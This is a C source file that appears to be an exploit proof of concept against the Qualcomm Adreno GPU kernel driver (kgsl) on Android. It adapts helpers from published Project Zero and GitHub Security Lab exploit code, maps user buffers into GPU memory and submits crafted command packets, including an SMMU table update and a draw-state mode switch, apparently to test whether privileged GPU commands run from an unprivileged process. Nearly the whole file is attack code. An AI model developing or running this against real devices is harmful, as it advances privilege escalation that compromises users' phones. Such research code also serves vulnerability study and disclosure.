#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO

#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include "adrenaline.h"
#include <string.h>

#define KGSL_MEMFLAGS_IOCOHERENT 0x80000000ULL

// from adrenaline.cpp:
// https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html

/* modified version of kilroy's kgsl_ctx_create. create a KGSL context that will use
 * ringbuffer 0, and make sure KGSL_CONTEXT_USER_GENERATED_TS is disabled */
int kgsl_ctx_create0(int fd, uint32_t *ctx_id) {
    struct kgsl_drawctxt_create req = {
            .flags = 0x00001812, // low prio, rb 0
    };
    int ret;

    ret = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &req);
    if (ret)
        return ret;

    *ctx_id = req.drawctxt_id;

    return 0;
}

/* cleanup an existing GPU context */
int kgsl_ctx_destroy(int fd, uint32_t ctx_id) {
    struct kgsl_drawctxt_destroy req = {
            .drawctxt_id = ctx_id,
    };

    return ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &req);
}

#define KGSL_MEMFLAGS_GPUREADONLY 0x01000000U

/* modified version of kilroy's kgsl_map. the choice to use KGSL_MEMFLAGS_USE_CPU_MAP
 * comes from earlier debugging efforts, but a normal user mapping should work as well,
 * it would just need to use uint64_t and drop the flags. */
// https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/kgsl_utils.c#L59
int kgsl_map(int fd, unsigned long addr, size_t len, uint64_t *gpuaddr) {
    struct kgsl_map_user_mem req = {
            .len = len,
            .offset = 0,
            .hostptr = addr,
            .memtype = KGSL_USER_MEM_TYPE_ADDR,
            // .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
    };
    int ret;

    ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    if (ret)
        return ret;

    *gpuaddr = req.gpuaddr;

    return 0;
}

/* send pad IBs and a payload IB at a specific index to the GPU. the index is chosen to win
 * the race condition with the targeted context switch */
int kgsl_gpu_command_payload(int fd, uint32_t ctx_id, uint64_t gpuaddr, uint32_t cmdsize, uint32_t n, uint32_t target_idx, uint64_t target_cmd, uint32_t target_size) {
    struct kgsl_command_object *cmds;

    struct kgsl_gpu_command req = {
            .context_id = ctx_id,
            .cmdsize = sizeof(struct kgsl_command_object),
            .numcmds = n,
    };
    size_t cmds_size;
    uint32_t i;

    cmds_size = n * sizeof(struct kgsl_command_object);

    cmds = (struct kgsl_command_object *) malloc(cmds_size);

    if (cmds == NULL) {
        return -1;
    }

    memset(cmds, 0, cmds_size);

    for (i = 0; i < n; i++) {
        cmds[i].flags = KGSL_CMDLIST_IB;

        if (i == target_idx) {
            cmds[i].gpuaddr = target_cmd;
            cmds[i].size = target_size;
        }
        else {
            /* the shift here is helpful for debugging failed alignment */
            cmds[i].gpuaddr = gpuaddr + (i << 16);
            cmds[i].size = cmdsize;
        }
    }

    req.cmdlist = (unsigned long) cmds;

    int err = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &req);

    free(cmds);
    return err;
}

#define CP_WAIT_MEM_WRITES 0x12
#define CP_SET_DRAW_STATE 0x43
#define CP_SET_MODE 0x63
#define CP_INDIRECT_BUFFER 0x3f
#define DRAW_STATE_MODE_BINNING 0x1
#define DRAW_STATE_MODE_GMEM 0x2
#define DRAW_STATE_MODE_BYPASS 0x4
#define DRAW_STATE_DIRTY (1 << 16)
#define CP_SMMU_TABLE_UPDATE 0x53

int main() {
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd == -1) {
        fprintf(stderr, "Can't open kgsl\n");
        return 1;
    }

    uint32_t ctx_id;

    int err = kgsl_ctx_create0(fd, &ctx_id);
    if (err) {
        fprintf(stderr, "Can't create context: %s\n", strerror(err));
        return 1;
    }

    uint32_t* payload_buf = mmap(NULL, PAGE_SIZE,
                                        PROT_READ|PROT_WRITE,
                                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (payload_buf == MAP_FAILED) {
        fprintf(stderr, "Can't map buf: %s\n", strerror(errno));
        return 1;
    }

    uint64_t payload_gpuaddr;

    err = kgsl_map(fd, (unsigned long)payload_buf, PAGE_SIZE, &payload_gpuaddr);
    if (err) {
        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
        return 1;
    }

    uint32_t* output_buf = (uint32_t *) mmap(NULL, PAGE_SIZE,
        PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    uint64_t output_gpuaddr;
    err = kgsl_map(fd, (unsigned long)output_buf, PAGE_SIZE, &output_gpuaddr);
    if (err) {
        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
        return 1;
    }

    // Sign of life: just ask the GPU to write something...

    uint32_t* drawstate_buf = payload_buf + 0x100;
    uint64_t drawstate_gpuaddr = payload_gpuaddr + 0x100*sizeof(uint32_t);
    uint32_t* drawstate_cmds = drawstate_buf;
    *drawstate_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, 0x1234567841414141);
    *drawstate_cmds++ = 0x42424242;
    *drawstate_cmds++ = 0x43434343;
    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, output_gpuaddr + 4);
    *drawstate_cmds++ = 0x42424242;

    uint32_t* payload_cmds = payload_buf;
#if 1
    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=527;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
    // This causes all drawstates to run immediately - see CP_SET_DRAW_STATE handler's disassembly
    *payload_cmds++ = cp_type7_packet(CP_SET_MODE, 1);
    *payload_cmds++ = 1;
#endif
#if 1
    *payload_cmds++ = cp_type7_packet(CP_SET_DRAW_STATE, 3);
    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=1089;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
    *payload_cmds++ = (drawstate_cmds - drawstate_buf) | ((DRAW_STATE_MODE_BINNING | DRAW_STATE_MODE_GMEM | DRAW_STATE_MODE_BYPASS) << 20);
    payload_cmds += cp_gpuaddr(payload_cmds, drawstate_gpuaddr);
#endif
#if 0
    *payload_cmds++ = cp_type7_packet(CP_INDIRECT_BUFFER, 3);
    payload_cmds += cp_gpuaddr(payload_cmds, drawstate_gpuaddr);
    *payload_cmds++ = (drawstate_cmds - drawstate_buf);
#endif
    *payload_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    payload_cmds += cp_gpuaddr(payload_cmds, output_gpuaddr);
    *payload_cmds++ = 0x41414141;

    uint32_t cmd_size = (payload_cmds - payload_buf) * sizeof(uint32_t);

    sleep(1);
    printf("running commands: %x %lx %x\n", ctx_id, payload_gpuaddr, cmd_size);
    for (int i = 0; i < cmd_size / sizeof(uint32_t); i++) {
        printf("%x ", payload_buf[i]);
    }
    printf("\n");
    // we don't need Adrenaline's multiple IB stuff - we just use it to run one IB
    // see https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/adreno_kernel.c#L188
    err = kgsl_gpu_command_payload(fd, ctx_id, /*gpuaddr=*/0, /*cmd_size=*/0, /*n=*/1, /*target_idx=*/0, payload_gpuaddr, cmd_size);
    if (err) {
        fprintf(stderr, "Can't run payload: %s\n", strerror(err));
        return 1;
    }

    sleep(1);
    while (1) {
        fprintf(stderr, "%x %x\n", output_buf[0], output_buf[1]);
        sleep(1);
    }

    err = kgsl_ctx_destroy(fd, ctx_id);
    if (err) {
        fprintf(stderr, "Can't destroy context: %s\n", strerror(err));
        return 1;
    }

    close(fd);
    return 0;
}